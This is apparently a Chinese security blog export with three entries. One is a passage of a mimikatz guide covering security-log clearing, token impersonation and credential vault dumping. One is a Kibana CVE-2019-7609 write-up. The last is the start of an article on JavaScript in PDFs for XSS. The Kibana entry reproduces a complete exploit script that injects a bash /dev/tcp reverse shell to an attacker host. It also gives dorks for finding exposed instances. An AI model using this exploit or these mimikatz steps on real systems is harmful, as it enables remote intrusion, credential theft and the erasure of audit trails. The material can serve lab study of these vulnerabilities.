<p>日志信息有很多，其中比较重要的是安全日志，其中包含xx在xx时间登录了</p>
<h3 id="event-clear"><a href="#event-clear" class="headerlink" title="event:clear"></a>event:clear</h3><p>清空安全日志</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155348440.png" class title="image-20211031155348440">



<h3 id="event-drop"><a href="#event-drop" class="headerlink" title="event:drop"></a>event:drop</h3><p>避免新的日志继续产生（现在效果还不好，是一个试验性的功能）</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><hr>
<p>杂项功能</p>
<h3 id="misc-cmd"><a href="#misc-cmd" class="headerlink" title="misc::cmd"></a>misc::cmd</h3><p>开启命令处理器</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155537674.png" class title="image-20211031155537674">



<h3 id="misc-regedit"><a href="#misc-regedit" class="headerlink" title="misc::regedit"></a>misc::regedit</h3><p>打开计算机注册表编辑器</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155708066.png" class title="image-20211031155708066">



<h3 id="misc-taskmgr"><a href="#misc-taskmgr" class="headerlink" title="misc::taskmgr"></a>misc::taskmgr</h3><p>打开系统任务管理器</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155837254.png" class title="image-20211031155837254">



<h3 id="misc-clip"><a href="#misc-clip" class="headerlink" title="misc::clip"></a>misc::clip</h3><p>监听剪切板，可以看到剪切板中的复制剪切的内容</p>
<p>执行之后会一直监听着，直到我们输入Ctrl+c停止该模块</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155954031.png" class title="image-20211031155954031">





<h2 id="dpapi"><a href="#dpapi" class="headerlink" title="dpapi"></a>dpapi</h2><hr>
<p>基于密码系统级别的应用数据保护服务（密码／私钥）</p>
<p>支持以上使用数据保护的服务</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031160213750.png" class title="image-20211031160213750">



<h3 id="dpapi-protect"><a href="#dpapi-protect" class="headerlink" title="dpapi::protect"></a>dpapi::protect</h3><img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031160401467.png" class title="image-20211031160401467">



<h3 id="dpapi-ssh"><a href="#dpapi-ssh" class="headerlink" title="dpapi::ssh"></a>dpapi::ssh</h3><p>查看客户端SSH注册记录</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161232541.png" class title="image-20211031161232541">





<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><hr>
<p>查看用户令牌</p>
<h3 id="token-whoami"><a href="#token-whoami" class="headerlink" title="token::whoami"></a>token::whoami</h3><p>查看你是who，当前操作用户</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161513486.png" class title="image-20211031161513486">



<h3 id="token-list"><a href="#token-list" class="headerlink" title="token::list"></a>token::list</h3><p>列出都有哪些登录了的账号</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161611130.png" class title="image-20211031161611130">



<h3 id="token-elevate-x2F-domain-域名"><a href="#token-elevate-x2F-domain-域名" class="headerlink" title="token::elevate &#x2F;domain(域名)"></a>token::elevate &#x2F;domain(域名)</h3><p>假如domain域存在，我们可以假冒成为域管理员的token</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161702476.png" class title="image-20211031161702476">



<h3 id="token-revert"><a href="#token-revert" class="headerlink" title="token::revert"></a>token::revert</h3><p>取消之前假冒的令牌，回到起初登录用户的令牌</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031161737723.png" class title="image-20211031161737723">



<h3 id="token-run"><a href="#token-run" class="headerlink" title="token::run"></a>token::run</h3><p>显示当前用户进程的相关信息</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162006155.png" class title="image-20211031162006155">



<h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><hr>
<h3 id="vault-list"><a href="#vault-list" class="headerlink" title="vault::list"></a>vault::list</h3><p>列出所有系统品证，包括Windows凭证和Web凭证</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162143549.png" class title="image-20211031162143549">



<h3 id="vault-cred"><a href="#vault-cred" class="headerlink" title="vault::cred"></a>vault::cred</h3><p>查看系统凭据。可以看到保存在系统上的所有凭证，比如github,Microsft等相关凭证</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031162335610.png" class title="image-20211031162335610">
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>-内网渗透 -工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>kibana未授权访问利用</title>
    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
<p>Kibana &lt; 6.6.1</p>
<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<p>Fofa:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>



<p>无需账号密码就可以登录进入图形化界面</p>
<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">



<p>下面利用脚本进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">



<p>反弹shell成功</p>
<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">



<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Kibana</category>
      </categories>
      <tags>
        <tag>-web应用漏洞 - Kibana -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文件上传-XSS</title>
    <url>/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/</url>
    <content><![CDATA[<h1 id="pdf文件上传-XSS"><a href="#pdf文件上传-XSS" class="headerlink" title="pdf文件上传-XSS"></a>pdf文件上传-XSS</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>pdf是portable document format的缩写，是目前广泛应用于各种场合的文件格式，其是由Adobe公司根据Postscript语言修改后提出的文件标准，并且被ISO组织接受，目前已经发展到2.0版本（ISO32000-2）。目前广泛使用的是1.7版本，该版本pdf功能已经相当丰富，可以显示3D模型，播放多媒体音视频，执行Javascript脚本等功能。</p>
<h2 id="PDF中的JavaScript利用"><a href="#PDF中的JavaScript利用" class="headerlink" title="PDF中的JavaScript利用"></a>PDF中的JavaScript利用</h2><hr>
<p>Pdf文件是应用广泛的一种文件格式，很多针对Adobe阅读器的CVE漏洞都是通过pdf文件中的某些结构触发，触发过程都需要执行事先嵌入在pdf文件中的Javascript脚本。例如CVE-2017-11254 Adobe Acrobat 和Reader中addAnnot Use After Free漏洞，就是通过调用Javascript代码调用addAnnot函数从而触发漏洞；以及CVE-2018-4901 针对pdf中Trailer结构里的ID字段的溢出漏洞，也是需要在文件中通过Javascript调用docID来进行触发。</p>
<p>通过研究发现，目前针对该攻击面的攻击主要分为以下三种方式：</p>
<ul>
<li>通过Javascript调用pdf中的模块进行攻击；</li>
<li>通过Javascript调用阅读器中提供的Javascript相关功能，进行攻击；</li>
<li>其他未知形式的攻击。</li>
</ul>
<h2 id="PDF中的JavaScript规范"><a href="#PDF中的JavaScript规范" class="headerlink" title="PDF中的JavaScript规范"></a>PDF中的JavaScript规范</h2><hr>
<p>在PDF中插入JavaScript的相关介绍信息可以在Javascript_api_reference.pdf中看到[文档下载](<a href="https://opensource.adobe.com/dc-acrobat-sdk-docs/acrobatsdk/pdfs/acrobatsdk_jsapiref.pdf">JavaScript for Acrobat API Reference (adobe.com)</a>)</p>
<p>文档开头函数介绍时，使用四元数组进行函数介绍，如图:</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115104213416.png" class title="image-20211115104213416">

<p>​            </p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115104316117.png" class title="image-20211115104316117">

<p>我们来看看这四元数组各自所代表的含义:</p>
<ul>
<li>第一列指的是该方法的启用版本以及是否还在使用</li>
<li>第二列指的是该方法引起的变化是否会影响文件</li>
<li>第三列指的是该方法执行需要特殊设置</li>
<li>第四列指的是该方法的可用性</li>
</ul>
<h2 id="PDF中的JavaScript影响范围"><a href="#PDF中的JavaScript影响范围" class="headerlink" title="PDF中的JavaScript影响范围"></a>PDF中的JavaScript影响范围</h2><hr>
<p>Pdf中的Javascript按照影响范围分为以下几种：文件夹级脚本、文档级脚本、页面级脚本、域级脚本以及批处理级脚本。所有类型的脚本都是事件驱动的，即当发生相应事件时，才会响应执行。</p>
<h3 id="文件夹级脚本"><a href="#文件夹级脚本" class="headerlink" title="文件夹级脚本"></a>文件夹级脚本</h3><p>可以影响Acrobat的变量声明和函数定义。一般用于增加菜单或者菜单项等针对Acrobat有影响的函数，包括两种:app和user。此类脚本一般是放到相应文件夹中，一般在Acrobat启动时载入，一般与event实体的应用初始化事件联系。</p>
<h3 id="文档级脚本"><a href="#文档级脚本" class="headerlink" title="文档级脚本"></a>文档级脚本</h3><p>可以影响给定文件的变量声明和函数定义，在文件之外不能应用。可以通过Acrobat创建该级别脚本嵌入pdf文件中。除该类型脚本外，还有文档级动作脚本，其触发动作包括：文件关闭前，文件保存前，文件保存后，文件打印前和文件打印后。</p>
<h3 id="页面级脚本"><a href="#页面级脚本" class="headerlink" title="页面级脚本"></a>页面级脚本</h3><p>该类型脚本在一页打开或关闭时执行。打开事件为当一个页面完成绘制或任何时候查看一个新页的时候。关闭事件为当用户查看的页面不再是当前页时。</p>
<h3 id="域级脚本"><a href="#域级脚本" class="headerlink" title="域级脚本"></a>域级脚本</h3><p>域级脚本与Acrobat中的表格域绑定，当用户与相应区域直接或间接交互时，即触发相应的域事件，该级别脚步存放在pdf文件中。</p>
<h2 id="PDF中的可利用函数"><a href="#PDF中的可利用函数" class="headerlink" title="PDF中的可利用函数"></a>PDF中的可利用函数</h2><hr>
<p>在pdf阅读器支持的所有Javascript函数中以下函数在实际应用中，还是可以对用户的使用造成一些困扰：</p>
<p>app.launchURL()、app.media.getURLdata()、app.alert()、app.execDialog()、doc.getURL。</p>
<h3 id="App-launchURL"><a href="#App-launchURL" class="headerlink" title="App.launchURL()"></a>App.launchURL()</h3><p>该函数在PDF中指定远程链接地址，用于加载远程文件。</p>
<p>该函数的四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115111527127.png" class title="image-20211115111527127">

<p>该函数包含两个参数，为cURL（用于指定文件的路径）和bNewFrame（用于指定是否用新建页面显示文件）。</p>
<p>当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后使用默认浏览器打开一个远程连接。</p>
<p>使用示例:</p>
<ul>
<li>example  1:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.launchURL(&quot;http://www.example.com/&quot;, true)；</span><br></pre></td></tr></table></figure>



<ul>
<li>example 2:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.addMenuItem(&#123;</span><br><span class="line">cName: &quot;myHelp&quot;, cUser: &quot;Online myHelp&quot;, </span><br><span class="line">cParent: &quot;Help&quot;, </span><br><span class="line">cExec: &quot;app.launchURL(&#x27;www.example.com/myhelp.html&#x27;);&quot;, </span><br><span class="line">nPos: 0 </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="App-media-getURLdata"><a href="#App-media-getURLdata" class="headerlink" title="App.media.getURLdata()"></a>App.media.getURLdata()</h3><p>该函数功能指定需要打开的多媒体文件。</p>
<p>该函数的四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115112442756.png" class title="image-20211115112442756">

<p>该函数包含两个参数，cURL（用于指定文件的路径）和cMimeType（可选，用于指定文件MIME类型）。</p>
<p>使用示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myURLClip = &quot;http://www.example.com/myClip.mpg&quot;;</span><br><span class="line">var args = &#123;</span><br><span class="line">URL: myURLClip,</span><br><span class="line">mimeType: &quot;video/x-mpg&quot;, </span><br><span class="line">doc: this,</span><br><span class="line">settings: &#123;</span><br><span class="line">players: app.media.getPlayers(&quot;video/x-mpg&quot;),</span><br><span class="line">windowType: app.media.windowType.floating,</span><br><span class="line">data: app.media.getURLData(myURLClip,&quot;video/x-mpg&quot;),</span><br><span class="line">floating: &#123; height: 400, width: 600 &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.media.openPlayer(args)</span><br></pre></td></tr></table></figure>



<p>当打开包含该函数的pdf文件时，首先会弹出窗口提醒用户建立远程链接，随后根据版本和应用不同可能会有安全提示，随后需要用户手动选择信任，最终使用系统默认的播放器播放URL指定的文件。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115112825740.png" class title="image-20211115112825740">



<h3 id="app-alert"><a href="#app-alert" class="headerlink" title="app.alert()"></a>app.alert()</h3><p>该函数哦那你可以弹出一个警示对话框。PDF_XSS主要是alert()函数来执行的.</p>
<p>该函数四元组如下:</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115113635850.png" class title="image-20211115113635850">



<p>该函数包含多个参数分别为：cMsg（用于指定对话框的内容）、nIcon（可选，用于指定对话框图标）、nType（可选，用于指定按钮的类型）、cTitle（可选，用于指定对话框标题）、oDoc（可选，指定与警告相关的Doc结构）、oCheckbox（可选，在对话框中放一个checkbox并且可以指定相关内容、初始值以及结束值）</p>
<p>使用示例:</p>
<ul>
<li>example1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Display a simple alert box:</span><br><span class="line"></span><br><span class="line">app.alert(&#123;</span><br><span class="line">cMsg: &quot;Error! Try again!&quot;, </span><br><span class="line">cTitle: &quot;Acme Testing Service&quot;&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>example 2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Close the document with the user’s permission:</span><br><span class="line">// A MouseUp action</span><br><span class="line"></span><br><span class="line">var nButton = app.alert(&#123; </span><br><span class="line">cMsg: &quot;Do you want to close this document?&quot;,</span><br><span class="line">cTitle: &quot;A message from A. C. Robat&quot;, </span><br><span class="line">nIcon: 2, nType: 2 </span><br><span class="line">&#125;);</span><br><span class="line">if ( nButton == 4 ) this.closeDoc()</span><br></pre></td></tr></table></figure>

<ul>
<li>example 3</li>
</ul>
